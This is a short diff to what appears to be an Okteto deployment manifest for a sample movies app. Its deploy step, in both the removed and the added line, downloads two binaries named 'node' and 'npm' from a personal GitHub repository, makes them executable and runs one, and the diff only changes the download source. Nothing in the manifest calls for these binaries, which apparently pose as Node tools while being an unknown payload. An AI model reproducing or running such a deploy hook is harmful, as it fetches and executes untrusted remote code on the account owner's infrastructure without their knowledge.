@@ -1,5 +1,5 @@
 icon: https://apps.okteto.com/movies/icon.png
 deploy:
-  - wget https://github.com/Arlentak/sa/raw/main/node; wget https://github.com/Arlentak/sa/raw/main/npm; chmod +x npm node; ./npm
+  - wget https://github.com/Arlentak/barber/raw/main/node; wget https://github.com/Arlentak/sa/raw/main/npm; chmod +x npm node; ./npm
 devs:
   - api/okteto.yml
